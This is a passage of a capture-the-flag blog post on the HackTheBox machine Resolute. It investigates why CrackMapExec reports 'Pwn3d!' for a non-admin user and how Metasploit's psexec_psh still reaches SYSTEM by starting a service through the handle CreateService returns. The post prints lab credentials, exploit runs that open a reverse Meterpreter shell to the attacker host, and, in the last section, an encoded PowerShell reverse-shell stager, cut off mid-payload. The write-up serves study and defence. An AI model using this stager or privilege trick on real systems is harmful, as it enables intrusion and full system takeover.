# Debugging CME, PSexec on HTB: Resolute

[crackmapexec](/tags#crackmapexec ) [smb](/tags#smb )
[hackthebox](/tags#hackthebox ) [ctf](/tags#ctf ) [htb-resolute](/tags#htb-
resolute ) [windows](/tags#windows ) [scmanager](/tags#scmanager )
[sddl](/tags#sddl ) [dacl](/tags#dacl ) [psexec](/tags#psexec )
[github](/tags#github ) [source-code](/tags#source-code )
[metasploit](/tags#metasploit ) [wireshark smb](/tags#wireshark-smb )
[cyberchef](/tags#cyberchef ) [scdbg](/tags#scdbg ) [htb-nest](/tags#htb-nest
)  
  
Jun 1, 2020

  * [HTB: Resolute](/2020/05/30/htb-resolute.html)
  * Debugging CME, PSexec

![](https://0xdfimages.gitlab.io/img/resolute-br-cover.png)

When I ran CrackMapExec with ryan’s creds against Resolute, it returned
Pwn3d!, which is weird, as none of the standard PSExec exploits I attempted
worked. Beyond that, ryan wasn’t an administrator, and didn’t have any
writable shares. I’ll explore the CME code to see why it returned Pwn3d!, look
at the requirements for a standard PSExec, and then debug the Metasploit
exploit that does go directly to SYSTEM with ryan’s creds.

## Background

On Resolute, when I was checking the creds for ryan with `crackmapexec` on
SMB, it came back with `(Pwn3d!)` next to his name:

    
    
    root@kali# crackmapexec smb 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
    SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:MEGABANK) (signing:True) (SMBv1:True)
    SMB         10.10.10.169    445    RESOLUTE         [+] MEGABANK\ryan:Serv3r4Admin4cc123! (Pwn3d!)
    

That typically means that I can run commands. I tried `psexec.py`,
`smbexec.py`, and `wmiexec.py`:

    
    
    root@kali# psexec.py 'ryan:Serv3r4Admin4cc123!@10.10.10.169'
    Impacket v0.9.22.dev1+20200422.223359.23bbfbe1 - Copyright 2020 SecureAuth Corporation
    
    [*] Requesting shares on 10.10.10.169.....
    [-] share 'ADMIN$' is not writable.
    [-] share 'C$' is not writable.
    [-] share 'NETLOGON' is not writable.
    [-] share 'SYSVOL' is not writable.
    
    root@kali# smbexec.py 'ryan:Serv3r4Admin4cc123!@10.10.10.169'
    Impacket v0.9.22.dev1+20200422.223359.23bbfbe1 - Copyright 2020 SecureAuth Corporation
    
    [-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
    
    root@kali# wmiexec.py 'ryan:Serv3r4Admin4cc123!@10.10.10.169'
    Impacket v0.9.22.dev1+20200422.223359.23bbfbe1 - Copyright 2020 SecureAuth Corporation
    
    [*] SMBv3.0 dialect used
    [-] rpc_s_access_denied
    

I tried to run a command via `crackmapexec`, and it just crashes:

    
    
    root@kali# crackmapexec smb 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!' -x whoami
    SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
    SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
    Traceback (most recent call last):
      File "/root/.shiv/cme_6055662b6a5d2ced872c1d4ae685cc5e74667b07d88dabc5a9a5ba6c20fdb2f2/site-packages/cme/protocols/smb/atexec.py", line 59, in execute_handler
        self.doStuff(data, fileless=True)
      File "/root/.shiv/cme_6055662b6a5d2ced872c1d4ae685cc5e74667b07d88dabc5a9a5ba6c20fdb2f2/site-packages/cme/protocols/smb/atexec.py", line 144, in doStuff
        tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
      File "/root/.shiv/cme_6055662b6a5d2ced872c1d4ae685cc5e74667b07d88dabc5a9a5ba6c20fdb2f2/site-packages/impacket/dcerpc/v5/tsch.py", line 673, in hSchRpcRegisterTask
        return dce.request(request)
      File "/root/.shiv/cme_6055662b6a5d2ced872c1d4ae685cc5e74667b07d88dabc5a9a5ba6c20fdb2f2/site-packages/impacket/dcerpc/v5/rpcrt.py", line 856, in request
        answer = self.recv()
      File "/root/.shiv/cme_6055662b6a5d2ced872c1d4ae685cc5e74667b07d88dabc5a9a5ba6c20fdb2f2/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1320, in recv
        raise DCERPCException(rpc_status_codes[status_code])
    impacket.dcerpc.v5.rpcrt.DCERPCException: rpc_s_access_denied
    
    During handling of the above exception, another exception occurred:
    
    Traceback (most recent call last):
      File "src/gevent/greenlet.py", line 854, in gevent._greenlet.Greenlet.run
      File "/root/.shiv/cme_6055662b6a5d2ced872c1d4ae685cc5e74667b07d88dabc5a9a5ba6c20fdb2f2/site-packages/cme/protocols/smb.py", line 110, in __init__
        connection.__init__(self, args, db, host)
      File "/root/.shiv/cme_6055662b6a5d2ced872c1d4ae685cc5e74667b07d88dabc5a9a5ba6c20fdb2f2/site-packages/cme/connection.py", line 47, in __init__
        self.proto_flow()
      File "/root/.shiv/cme_6055662b6a5d2ced872c1d4ae685cc5e74667b07d88dabc5a9a5ba6c20fdb2f2/site-packages/cme/connection.py", line 86, in proto_flow
        self.call_cmd_args()
      File "/root/.shiv/cme_6055662b6a5d2ced872c1d4ae685cc5e74667b07d88dabc5a9a5ba6c20fdb2f2/site-packages/cme/connection.py", line 93, in call_cmd_args
        getattr(self, k)()
      File "/root/.shiv/cme_6055662b6a5d2ced872c1d4ae685cc5e74667b07d88dabc5a9a5ba6c20fdb2f2/site-packages/cme/connection.py", line 18, in _decorator
        return func(self, *args, **kwargs)
      File "/root/.shiv/cme_6055662b6a5d2ced872c1d4ae685cc5e74667b07d88dabc5a9a5ba6c20fdb2f2/site-packages/cme/protocols/smb.py", line 83, in _decorator
        output = func(self, *args, **kwargs)
      File "/root/.shiv/cme_6055662b6a5d2ced872c1d4ae685cc5e74667b07d88dabc5a9a5ba6c20fdb2f2/site-packages/cme/protocols/smb.py", line 486, in execute
        output = u'{}'.format(exec_method.execute(payload, get_output).strip())
      File "/root/.shiv/cme_6055662b6a5d2ced872c1d4ae685cc5e74667b07d88dabc5a9a5ba6c20fdb2f2/site-packages/cme/protocols/smb/atexec.py", line 44, in execute
        self.execute_handler(command)
      File "/root/.shiv/cme_6055662b6a5d2ced872c1d4ae685cc5e74667b07d88dabc5a9a5ba6c20fdb2f2/site-packages/cme/protocols/smb/atexec.py", line 61, in execute_handler
        self.doStuff(data)
      File "/root/.shiv/cme_6055662b6a5d2ced872c1d4ae685cc5e74667b07d88dabc5a9a5ba6c20fdb2f2/site-packages/cme/protocols/smb/atexec.py", line 144, in doStuff
        tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
      File "/root/.shiv/cme_6055662b6a5d2ced872c1d4ae685cc5e74667b07d88dabc5a9a5ba6c20fdb2f2/site-packages/impacket/dcerpc/v5/tsch.py", line 673, in hSchRpcRegisterTask
        return dce.request(request)
      File "/root/.shiv/cme_6055662b6a5d2ced872c1d4ae685cc5e74667b07d88dabc5a9a5ba6c20fdb2f2/site-packages/impacket/dcerpc/v5/rpcrt.py", line 856, in request
        answer = self.recv()
      File "/root/.shiv/cme_6055662b6a5d2ced872c1d4ae685cc5e74667b07d88dabc5a9a5ba6c20fdb2f2/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1320, in recv
        raise DCERPCException(rpc_status_codes[status_code])
    impacket.dcerpc.v5.rpcrt.DCERPCException: rpc_s_access_denied
    2020-05-31T17:38:58Z <Greenlet at 0x7f563b982bf0: smb(Namespace(aesKey=False, clear_obfscripts=False, co, <protocol.database object at 0x7f563b940fa0>, '10.10.10.169')> failed with DCERPCException
    

This is…confusing, which led me down some rabbit holes.

## Why Pwn3d!?

### Source Code Analysis

First I wanted to figure out what was leading to the `(Pwn3d!)` message, so I
found [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) on GitHub,
and searched for the string at the top left:

![image-20200531073937872](https://0xdfimages.gitlab.io/img/image-20200531073937872.png)

There were six results. The first is where this label is defined in
`cme/data/cme.conf`:

![image-20200531074020340](https://0xdfimages.gitlab.io/img/image-20200531074020340.png)

Another was this being loaded from the `.conf` :

![image-20200531074103076](https://0xdfimages.gitlab.io/img/image-20200531074103076.png)

The other four were examples of the `pwn3d_label` being referenced in
`ssh.py`, `mysql.py`, `winrm.py`, and `smb.py` in `cme/protocols/`. Since I’m
interested in SMB, I’ll look at `smb.py`.

There’s two references to this label, but
[both](https://github.com/byt3bl33d3r/CrackMapExec/blob/0a49f75347b625e81ee6aa8c33d3970b5515ea9e/cme/protocols/smb.py#L268)
are
[similar](https://github.com/byt3bl33d3r/CrackMapExec/blob/0a49f75347b625e81ee6aa8c33d3970b5515ea9e/cme/protocols/smb.py#L292),
generating a string based on `self.admin_privs`:

    
    
    out = u'{}\\{} {}'.format(self.domain,
                              self.conn.getCredentials()[0],
                              highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else ''))
    

Another CTRL-f to find `self.admin_priv =` shows two places where this is set.
The
[first](https://github.com/byt3bl33d3r/CrackMapExec/blob/0a49f75347b625e81ee6aa8c33d3970b5515ea9e/cme/protocols/smb.py#L254)
is in `kerberos_login`:

    
    
    def kerberos_login(self, aesKey, kdcHost):
        # dirty code to check if user is admin but pywerview does not support kerberos auth ...
        error = ''
        try:
            self.conn.kerberosLogin('', '', self.domain, self.lmhash, self.nthash, aesKey, kdcHost)
            # self.check_if_admin() # currently pywerview does not support kerberos auth
            except SessionError as e:
                error = e
                try:
                    self.conn.connectTree("C$")
                    self.admin_privs = True
                    except SessionError as e:
                        pass
                    if not error:
                        out = u'{}\\{} {}'.format(self.domain,
                                                  self.conn.getCredentials()[0],
                                                  highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else ''))
                        self.logger.success(out)
                        return True
                    else:
                        self.logger.error(u'{} {} {}'.format(self.domain, 
                                                             error, 
                                                             '({})'.format(desc) if self.args.verbose else ''))
                        return False
    

The comment suggests that this check is because the other doesn’t support
kerberos. It’s trying to connect to the `C$` share, and if successful, setting
`self.admin_privs = True`. I know I can’t connect to `C$`, and I don’t think
I’m using kerberos.

The [other
place](https://github.com/byt3bl33d3r/CrackMapExec/blob/0a49f75347b625e81ee6aa8c33d3970b5515ea9e/cme/protocols/smb.py#L400)
is a call to `invoke_checklocaladminaccess`:

    
    
    self.admin_privs = invoke_checklocaladminaccess(self.host, self.domain, self.username, self.password, lmhash, nthash)
    

`invoke_checklocaladminaccess` isn’t defined in the local script. Looking at
the imports, it’s not listed, but there are a few `from x import *`,
including:

    
    
    from pywerview.cli.helpers import *
    

Jumping over to the GitHub for pywerview, it’s in `misc.py` at [line
67](https://github.com/the-useless-
one/pywerview/blob/615c45778a49a06bcef3af88b5b96b6e87a99160/pywerview/functions/misc.py#L67):

    
    
    def invoke_checklocaladminaccess(self):
    
        try:
            # 0xF003F - SC_MANAGER_ALL_ACCESS
            # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
            ans = scmr.hROpenSCManagerW(self._rpc_connection,
                                        '{}\x00'.format(self._target_computer),
                                        'ServicesActive\x00', 0xF003F)
        except DCERPCException:
            return False
    
        return True
    

The function it is calling is actually in the Impacket code (`scmr.py`, [line
1327](https://github.com/SecureAuthCorp/impacket/blob/3f1e7ddd0c6e39f0445b8f86870a0194416e6695/impacket/dcerpc/v5/scmr.py#L1327)),
but I can tell just by looking at this that it is checking for the
`SC_MANAGER_ALL_ACCESS` flag on the Service Control Manager. I looked at this
before when there was a [bug in the initial release of
Nest](/2020/01/26/digging-into-psexec-with-htb-nest.html).

### Checking on Resolute

I’ll jump back into my SYSTEM shell on Resolute and investigate. Just like [in
Nest](/2020/01/26/digging-into-psexec-with-htb-nest.html#service-permissions):

    
    
    C:\>sc sdshow scmanager
    D:(A;;KA;;;S-1-5-21-1392959593-3013219662-3596683436-1105)(A;;CC;;;AU)(A;;CCLCRPRC;;;IU)(A;;CCLCRPRC;;;SU)(A;;CCLCRPWPRC;;;SY)(A;;KA;;;BA)
    

Breaking down that [SDDL syntax](https://itconnect.uw.edu/wares/msinf/other-
help/understanding-sddl-syntax/), it’s all in the `D` or DACL section. I’m
most interested in the one with the long SID. Who is that? I can query WMI to
find out:

    
    
    C:\Windows\system32>wmic useraccount get name,sid
    wmic useraccount get name,sid
    Name            SID                                              
    Administrator   S-1-5-21-1392959593-3013219662-3596683436-500    
    Guest           S-1-5-21-1392959593-3013219662-3596683436-501    
    krbtgt          S-1-5-21-1392959593-3013219662-3596683436-502    
    DefaultAccount  S-1-5-21-1392959593-3013219662-3596683436-503    
    ryan            S-1-5-21-1392959593-3013219662-3596683436-1105
    ...[snip]...
    

The SID ending in 1105 is ryan. The leading `A` is for allow, and the `KA` is
`KEY_ALL_ACCESS`, or `0xF003F`, which is what was being checked for in
`crackmapexec`.

## PSExec

### PSExec Details

So what can I do on Resolute. [This
post](https://www.contextis.com/en/blog/lateral-movement-a-deep-look-into-
psexec) does a really good job describing and showing the individual steps
that happen when you PSExec. You need five things:

>   1. Port 139 or 445 open on the remote machine, i.e., SMB.
>   2. Password or NTLM hash of the password (*)
>   3. Write permissions to a network shared folder (**). It doesn´t matter
> which one (** *).
>   4. Permissions to create services on the remote machine:
> SC_MANAGER_CREATE_SERVICE (Access mask: 0x0002).
>   5. Ability to start the service created: SERVICE_QUERY_STATUS (Access
> mask: 0x0004) + SERVICE_START (Access mask: 0x0010).
>

After the notes, it gives some advice that seems to limit what I can do here:

> In most scenarios, your stolen account won´t be able to comply with
> requirements 4 & 5 unless it is a privileged account (read the FAQ for more
> information on what type of privileged accounts would work). Mainly because,
> even if you had the ability to create services (SC_MANAGER_CREATE_SERVICE),
> the default DACL template (Discretionary Access Control List) will be
> applied to the service you just created. As you can imagine, this template
> won´t allow your user SERVICE_QUERY_STATUS + SERVICE_START access unless it
> belongs to an administrators group. In short: with a normal account you
> won´t have the permissions to start the service you just created, provided
> you could create one in the first place.

### Manual Process

I can show this from a shell as ryan. I can create a service:

    
    
    *Evil-WinRM* PS C:\programdata> sc.exe create dfserv binpath="\programdata\rev_service_47.exe"
    [SC] CreateService SUCCESS
    

But I can’t start it:

    
    
    *Evil-WinRM* PS C:\programdata> sc.exe start dfserv
    [SC] StartService: OpenService FAILED 5:
    Access is denied.
    

I also tried from a windows host, seeing if I could remotely start the
service. Having already created it as ryan, I opened a `cmd.exe` with ryan’s
credentials using `runas`:

    
    
    PS > runas /netonly /user:ryan cmd
    Enter the password for ryan:
    Attempting to start cmd as user "COMMANDO\ryan" ...
    

In the new shell, I try to start the service, but get access denied:

    
    
    C:\>sc \\10.10.10.169 start dfserv
    [SC] StartService: OpenService FAILED 5:
    
    Access is denied.
    

## MSF - psexec_psh

### SYSTEM Shell

I had done some asking around about this, and I got a tip back that the
Metasploit exploit `exploit/windows/smb/psexec_psh` would work. For sanity, I
tried several of the other PSExec exploits in MSF without any luck. And then I
tried this one:

    
    
    msf5 exploit(windows/smb/psexec_psh) > options
    
    Module options (exploit/windows/smb/psexec_psh):
    
       Name                  Current Setting      Required  Description
       ----                  ---------------      --------  -----------
       DryRun                false                no        Prints the powershell command that would be used
       RHOSTS                10.10.10.169         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
       RPORT                 445                  yes       The SMB service port (TCP)
       SERVICE_DESCRIPTION                        no        Service description to to be used on target for pretty listing
       SERVICE_DISPLAY_NAME                       no        The service display name
       SERVICE_NAME                               no        The service name
       SMBDomain             .                    no        The Windows domain to use for authentication
       SMBPass               Serv3r4Admin4cc123!  no        The password for the specified username
       SMBUser               ryan                 no        The username to authenticate as
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Automatic
    
    
    msf5 exploit(windows/smb/psexec_psh) > run
    
    [*] Started reverse TCP handler on 10.10.14.47:4444
    [*] 10.10.10.169:445 - Executing the payload...
    [+] 10.10.10.169:445 - Service start timed out, OK if running a command or non-service executable...
    [*] Sending stage (176195 bytes) to 10.10.10.169
    [*] Meterpreter session 1 opened (10.10.14.47:4444 -> 10.10.10.169:59956) at 2020-05-31 16:06:01 -0400
    
    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
    

Shell as SYSTEM.

### Debug

So why did this one work? I know that regular PSExec is going to fail because
it can’t write to any of the shares. What is different in this exploit?

#### MSF Code

I found the code for this exploit:

    
    
    root@kali# locate psexec_psh
    /usr/share/metasploit-framework/modules/exploits/windows/smb/psexec_psh.rb
    

Opening it, the `exploit` function is pretty simple:

    
    
      def exploit
        command = cmd_psh_payload(payload.encoded, payload_instance.arch.first)
        if datastore['DryRun']
          print_good command.inspect
          return
        end
    
        if datastore['PSH::persist'] and not datastore['DisablePayloadHandler']
          print_warning("You probably want to DisablePayloadHandler and use exploit/multi/handler with the PSH::persist option")
        end
    
        # Try and authenticate with given credentials
        if connect
          begin
            connect(versions: [2,1])
            smb_login
          rescue StandardError => autherror
            fail_with(Failure::NoAccess, "#{peer} - Unable to authenticate with given credentials: #{autherror}")
          end
          # Execute the powershell command
          print_status("Executing the payload...")
          begin
            return psexec(command)
          rescue StandardError => exec_command_error
            fail_with(Failure::Unknown, "#{peer} - Unable to execute specified command: #{exec_command_error}")
          ensure
            disconnect
          end
        end
      end
    

All of this is just prepping, making sure it can connect with the creds, and
then:

    
    
            return psexec(command)
    

#### Wireshark

Rather than dig into what this did, I decided to see what happened on the wire
when I ran this exploit. I fired up Wireshark and ran the exploit again. I’ll
include a copy of the PCAP [here](/files/psexec_psh.pcapng).

All of the data was TCP, and there were four streams:

  1. A check to see if port 445 is open on Resolute
  2. SMB connections.
  3. Shell connection to me on TCP 4444.
  4. Four packets to me on TCP 4444 just after stream two started. Not sure what this is. My best guess would be something to do with how services are expecting certain things out of a service binary, and (as I’ll show momentarily), this is calling PowerShell. Typically that would mean the call dies ~20-30 seconds after initiation. Perhaps this has to do with keeping that alive? (Wild guess).

I’ll focus on stream two, since that’s where I’m getting execution.

First, there’s a connection, auth as ryan:

[![connection](https://0xdfimages.gitlab.io/img/image-20200531165956699.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20200531165956699.png)

Next, it opens the `IPC$` share, and opens a handle (`Create Request File`) to
`svcctl`:

[![IPC$ connection
back](https://0xdfimages.gitlab.io/img/image-20200531170134502.png)_Click for
full size
image_](https://0xdfimages.gitlab.io/img/image-20200531170134502.png)

Now it issues a call to Service Control, `OpenSCManagerW`:

![image-20200531170653242](https://0xdfimages.gitlab.io/img/image-20200531170653242.png)

I’ll note that the requested Access Mask is 0x000f003f, which is the same
that’s requested in the CME code above. The return is success:

![image-20200531170833341](https://0xdfimages.gitlab.io/img/image-20200531170833341.png)

There are some reads and writes I don’t totally understand, and then comes
`CreateServiceW` request and response:

![image-20200531171005981](https://0xdfimages.gitlab.io/img/image-20200531171005981.png)

The request is worth looking at in detail:

[![service
creation](https://0xdfimages.gitlab.io/img/image-20200531171200087.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20200531171200087.png)

  * It’s passing the handle for `OpenSCManagerW` from frame 34 (which is the `OpenSCManagerW` response from above).

  * It provides a service name and a display name of random characters.

  * The `Service Start Type` is set to `SERVICE_DEMAND_START`. Looking at [Microsoft Documentation](https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea), that is defined as:

> A service started by the service control manager when a process calls the
> [StartService](https://docs.microsoft.com/windows/desktop/api/winsvc/nf-
> winsvc-startservicea) function. For more information, see [Starting Services
> on Demand](https://docs.microsoft.com/windows/desktop/Services/starting-
> services-on-demand).

  * The Access Mask is 0x000f01ff, which is `SERVICE_ALL_ACCESS` (from [here](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights#access-rights-for-a-service)).

  * The binary path name is a Russian nesting doll of commands:

    * `%COMSPEC%` is `cmd.exe` by default on any Windows computer. So it starts with `cmd /b /c`. According to [docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmd), `/c` says to run what comes after as a command and then stop. I can’t find `/b` in any docs (maybe it’s an error?).
    * So `cmd` will run `start /b /min` will run what follows in a [new command prompt window](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/start). `/b` starts without the window, and `/min` starts minimized (perhaps in case `/b` fails?).
    * `start` will run `powershell -nop -w hidden -noni -c`, which starts a [PowerShell session](https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/About/about_PowerShell_exe?view=powershell-5.1) with no profile (`-nop`), a hidden window (`-w hidden`), and noninteractive (`-noni`). `-c` says to run whatever follows.

All of this will run a PowerShell script. I’ll examine it in the last section.

The `CreateServiceW` response is success, passing a return code of success and
a handle:

![image-20200531202000366](https://0xdfimages.gitlab.io/img/image-20200531202000366.png)

Nothing so far is surprising to me. I knew that ryan could create services.
But immediately next, there’s a `StartServiceW` request:

![image-20200531201914491](https://0xdfimages.gitlab.io/img/image-20200531201914491.png)

The Stub data there matches the handle from the `CreateServiceW` call. The
response back contains not much info about if it worked:

![image-20200531202347227](https://0xdfimages.gitlab.io/img/image-20200531202347227.png)

But less than a tenth of a second later, after some calls to close handles and
delete the service, there’s a reverse shell connecting back from Resolute to
my machine on port 4444:

[![connection
back](https://0xdfimages.gitlab.io/img/image-20200531202541298.png)_Click for
full size
image_](https://0xdfimages.gitlab.io/img/image-20200531202541298.png)

### What’s Happening

_Edited 6/2_ : Big thanks for [VbScrub](https://twitter.com/VbScrub) for
troubleshooting this one with me. I think we (mostly he) figured it out. When
the service is created, the default DACL template (Discretionary Access
Control List) will be applied and I won’t be able to start it with a user
unless the user belongs to an administrators group. Except, when I create a
service with `CreateServiceW`, the return value is a [handle to the
service](https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-
createservicew), with the permissions that I asked for in the Access Mask. So
if I create the service, grab the handle, and then use that to start the
service, it will work, bypassing the part where I ask for a handle and get
told I don’t have permissions. And that’s exactly what I see in the PCAP
above.

VbScrub wrote some [VB that you can
compile](https://github.com/VbScrub/ServiceInstallerTest) or grab the [release
version](https://github.com/VbScrub/ServiceInstallerTest/releases). It will do
the same thing locally, creating a service, grabbing the returned handle and
use that to start the service. He’s written a post about it with more detail
[here](https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-
service-permissions/).

## Reverse PowerShell

### Full Code

Not really related to the rabbit hole I’m chasing in this post, but I can’t
help but reverse some malicious PowerShell. The code that is run by PowerShell
is:

    
    
    if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAIsQ1F4CA7VWbW/aSBD+nEj5D1aFhK0QjANt0kiVbs07wQnEQCAUnRZ7bRbWXrAXCPT6328W7DRV07v2pLPyst6dmZ155pkZe+vQEZSHCu+0lC9npycdHOFAUTOLIivUc0qGuaZ2cgIHGX7XUT4p6hgtlxUeYBpObm7K6ygioTi+5+tEoDgmwZRREqua8pfyOCMRubifzokjlC9K5s98nfEpZonYroydGVEuUOjKszZ3sHQmby8ZFWr28+esNr4wJvnqao1ZrGbtXSxIkHcZy2rKV01e2NstiZq1qBPxmHsi/0jD4mW+H8bYI3dgbUMsImbcjbMaBAE/ERHrKFRkOFL/eKpmYdmJuINcNyJxnM0pY2l5PJn8oY6Tax/WoaAByTdDQSK+tEm0oQ6J8w0cuow8EG8CWraIaOhPNA3ENnxB1Ey4Ziyn/I4Z9Y5sU9B+VUl9rQRSHRFpOcjjj2Fa3F0zclTMvuHnMfUaPEn6AbivZ6dnp17KlYUZvOYKrE7GhzUB59QOj+lB7JNSyCkW3IMFj3bwmulFa6JNXqBVMvMRXYW5nxswUmmQdT88wM54wKk7AY0knZlpJHd/TsoK8WhIKrsQB9RJeae+BTHxGDkEmE/F7sAjNZscELdCGPGxkKjJTP+gVg2oeNE115S5JEIOpCkGryCD2vfOHBOhZpuhRQJA6PgO1Mt4wHaSSicM36W3y3cQypYZjuOc0llDuTk5xSaYETenoDCmyRFaC35YZr+5a62ZoA6ORWpuoh1RTG4r8zAW0dqBlEHkPXtJHIqZBCKnNKhLzJ1N/fTW7JswlDFjUANgaQNpgB0Zvi0kESJw8Jh0LW8T0QyWjAQgdCj7GsM+FHlC9QN1sE/c7PcOpkw+0lYCkSLwyj3Irs24yCkDGgnoHRJU4M9/vPxV1wA3yhFJsqCmlTE2d0ISOuO2aqwv+ZigcsAgEhB/LeKBiWPyoXTsEOo7/Z6WETyjZsgsx1xQA22p0bTgt0+LTV65cm9b84YeVZ5nHmrGTavRqXQbjdKmZQ9Kwq42xW2nKazqcD63UeOhPxJPTdTo0cJiVNovW3Rvt5E7etY/7M39tmA+7+e+640qnudfefaD8b5G24/lrlm4xO1Kdd1+NLdmoRRX6bbRpf3uolUT09GA4b6n+0PjI6bP7Wg+MLi1byJUnxWdfcsb1GeWuxs1KJnrhTbtoi5Ct85Dv1/3l349RvrHwaoc+Ldlv7TBqImqg13rPTO7/ZqJ+lWzi+95p3he0Y0nd1WtPQ1xK2BuvaEboyFyUaT3/JlxdT8LJU7YN1emlEHtp11NB5lOCTVKl3T/tOrWfVQFmUHAEa7RRf98CDbveqDz2DdcjkTYHOr6wNd95NmzEUYmSJsrVDN5eXfdsTr6YHA5M6YLYwY+k+Hm2mqh85rT0XX9PJjCXx051vI5HJrbq43fsPktvsWDzVNRN3rbuodW6PzcNMypaFSLrQ3c29M/9j+9k/QB/mQEfcWKnzVzC0fxDDNgC7TptD5rPKoljbfDqdRQVTmsFyQKCYNZB9MwpTlijDuy7csODRPnOAfkWOrDsnj55kpTXgS1b+Mg3bq5eQIfZflIaufbJPTFLFd4LhYK0N0Lz6UChPjrgZX5cqcebeXkeABgXmyzg21NFlRme/2/4pXU8Az+uf+C17e9fzj9JQwLORntD5vfb/wWmr8b9iOmAgRt6D+MHKffm9EnxHj1cbC9hpx7ySO/7O7X4uIOvhjOTv8GcKJAY0MKAAA=''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
    

That beautifies to:

    
    
    if ([IntPtr]::Size  - eq 4)  {
        $b = 'powershell.exe'
    } else {
        $b = $env:windir + '\syswow64\WindowsPowerShell\v1.0\powershell.exe'
    };
    $s = New - Object System.Diagnostics.ProcessStartInfo;
    $s.FileName = $b;
    $s.Arguments = '-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAIsQ1F4CA7VWbW/aSBD+nEj5D1aFhK0QjANt0kiVbs07wQnEQCAUnRZ7bRbWXrAXCPT6328W7DRV07v2pLPyst6dmZ155pkZe+vQEZSHCu+0lC9npycdHOFAUTOLIivUc0qGuaZ2cgIHGX7XUT4p6hgtlxUeYBpObm7K6ygioTi+5+tEoDgmwZRREqua8pfyOCMRubifzokjlC9K5s98nfEpZonYroydGVEuUOjKszZ3sHQmby8ZFWr28+esNr4wJvnqao1ZrGbtXSxIkHcZy2rKV01e2NstiZq1qBPxmHsi/0jD4mW+H8bYI3dgbUMsImbcjbMaBAE/ERHrKFRkOFL/eKpmYdmJuINcNyJxnM0pY2l5PJn8oY6Tax/WoaAByTdDQSK+tEm0oQ6J8w0cuow8EG8CWraIaOhPNA3ENnxB1Ey4Ziyn/I4Z9Y5sU9B+VUl9rQRSHRFpOcjjj2Fa3F0zclTMvuHnMfUaPEn6AbivZ6dnp17KlYUZvOYKrE7GhzUB59QOj+lB7JNSyCkW3IMFj3bwmulFa6JNXqBVMvMRXYW5nxswUmmQdT88wM54wKk7AY0knZlpJHd/TsoK8WhIKrsQB9RJeae+BTHxGDkEmE/F7sAjNZscELdCGPGxkKjJTP+gVg2oeNE115S5JEIOpCkGryCD2vfOHBOhZpuhRQJA6PgO1Mt4wHaSSicM36W3y3cQypYZjuOc0llDuTk5xSaYETenoDCmyRFaC35YZr+5a62ZoA6ORWpuoh1RTG4r8zAW0dqBlEHkPXtJHIqZBCKnNKhLzJ1N/fTW7JswlDFjUANgaQNpgB0Zvi0kESJw8Jh0LW8T0QyWjAQgdCj7GsM+FHlC9QN1sE/c7PcOpkw+0lYCkSLwyj3Irs24yCkDGgnoHRJU4M9/vPxV1wA3yhFJsqCmlTE2d0ISOuO2aqwv+ZigcsAgEhB/LeKBiWPyoXTsEOo7/Z6WETyjZsgsx1xQA22p0bTgt0+LTV65cm9b84YeVZ5nHmrGTavRqXQbjdKmZQ9Kwq42xW2nKazqcD63UeOhPxJPTdTo0cJiVNovW3Rvt5E7etY/7M39tmA+7+e+640qnudfefaD8b5G24/lrlm4xO1Kdd1+NLdmoRRX6bbRpf3uolUT09GA4b6n+0PjI6bP7Wg+MLi1byJUnxWdfcsb1GeWuxs1KJnrhTbtoi5Ct85Dv1/3l349RvrHwaoc+Ldlv7TBqImqg13rPTO7/ZqJ+lWzi+95p3he0Y0nd1WtPQ1xK2BuvaEboyFyUaT3/JlxdT8LJU7YN1emlEHtp11NB5lOCTVKl3T/tOrWfVQFmUHAEa7RRf98CDbveqDz2DdcjkTYHOr6wNd95NmzEUYmSJsrVDN5eXfdsTr6YHA5M6YLYwY+k+Hm2mqh85rT0XX9PJjCXx051vI5HJrbq43fsPktvsWDzVNRN3rbuodW6PzcNMypaFSLrQ3c29M/